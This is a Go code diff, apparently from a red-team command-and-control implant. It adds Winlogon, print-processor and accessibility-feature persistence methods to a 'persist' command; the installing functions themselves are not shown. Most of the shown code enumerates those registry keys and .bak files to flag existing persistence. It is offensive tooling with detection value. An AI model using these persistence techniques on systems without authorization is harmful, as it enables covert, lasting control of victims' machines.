@@ -66,10 +66,16 @@ func (c *PersistCommand) Execute(task structs.Task) structs.CommandResult {
 		return persistScreensaver(args)
 	case "ifeo":
 		return persistIFEO(args)
+	case "winlogon":
+		return persistWinlogon(args)
+	case "print-processor":
+		return persistPrintProcessor(args)
+	case "accessibility":
+		return persistAccessibility(args)
 	case "list":
 		return listPersistence(args)
 	default:
-		return errorf("Unknown method: %s. Use: registry, startup-folder, com-hijack, screensaver, ifeo, or list", args.Method)
+		return errorf("Unknown method: %s. Use: registry, startup-folder, com-hijack, screensaver, ifeo, winlogon, print-processor, accessibility, or list", args.Method)
 	}
 }
 
@@ -297,6 +303,80 @@ func listPersistence(args persistArgs) structs.CommandResult {
 	}
 	if !ifeoFound {
 		lines = append(lines, "  (none detected)")
+	}
+	lines = append(lines, "")
+
+	// Check Winlogon Helper (Shell/Userinit)
+	lines = append(lines, "--- Winlogon Helper (HKLM\\...\\Winlogon) ---")
+	winlogonKey, err := registry.OpenKey(registry.LOCAL_MACHINE, winlogonKeyPath, registry.QUERY_VALUE)
+	if err != nil {
+		lines = append(lines, fmt.Sprintf("  Error: %v", err))
+	} else {
+		shell, _, shellErr := winlogonKey.GetStringValue("Shell")
+		userinit, _, uiErr := winlogonKey.GetStringValue("Userinit")
+		winlogonKey.Close()
+		if shellErr == nil {
+			lines = append(lines, fmt.Sprintf("  Shell    = %s", shell))
+			if strings.Contains(shell, ",") {
+				lines = append(lines, "  ⚠ Shell contains multiple entries (possible persistence)")
+			}
+		}
+		if uiErr == nil {
+			lines = append(lines, fmt.Sprintf("  Userinit = %s", userinit))
+			// Count entries (comma-delimited, last entry has trailing comma)
+			parts := strings.Split(strings.TrimRight(userinit, ","), ",")
+			if len(parts) > 1 {
+				lines = append(lines, fmt.Sprintf("  ⚠ Userinit contains %d entries (possible persistence)", len(parts)))
+			}
+		}
+	}
+	lines = append(lines, "")
+
+	// Check Print Processors
+	lines = append(lines, "--- Print Processors (HKLM\\...\\Print Processors) ---")
+	ppKey, err := registry.OpenKey(registry.LOCAL_MACHINE, printProcessorRegBase, registry.ENUMERATE_SUB_KEYS)
+	ppFound := false
+	if err != nil {
+		lines = append(lines, fmt.Sprintf("  Error: %v", err))
+	} else {
+		ppNames, _ := ppKey.ReadSubKeyNames(-1)
+		ppKey.Close()
+		// Known legitimate processors to skip
+		for _, ppName := range ppNames {
+			subPath := printProcessorRegBase + `\` + ppName
+			subKey, err := registry.OpenKey(registry.LOCAL_MACHINE, subPath, registry.QUERY_VALUE)
+			if err != nil {
+				continue
+			}
+			driver, _, err := subKey.GetStringValue("Driver")
+			subKey.Close()
+			if err == nil && driver != "" {
+				lines = append(lines, fmt.Sprintf("  %s → %s", ppName, driver))
+				ppFound = true
+			}
+		}
+	}
+	if !ppFound {
+		lines = append(lines, "  (none found or access denied)")
+	}
+	lines = append(lines, "")
+
+	// Check Accessibility Feature replacements
+	lines = append(lines, "--- Accessibility Features (System32 binary integrity) ---")
+	sys32 := os.Getenv("SystemRoot")
+	if sys32 == "" {
+		sys32 = `C:\Windows`
+	}
+	accessFound := false
+	for _, target := range accessibilityTargets {
+		backupPath := filepath.Join(sys32, "System32", target[0]+".bak")
+		if _, err := os.Stat(backupPath); err == nil {
+			lines = append(lines, fmt.Sprintf("  ⚠ %s has backup (.bak exists) — %s", target[0], target[1]))
+			accessFound = true
+		}
+	}
+	if !accessFound {
+		lines = append(lines, "  (no replaced binaries detected)")
 	}
 	lines = append(lines, "")
 
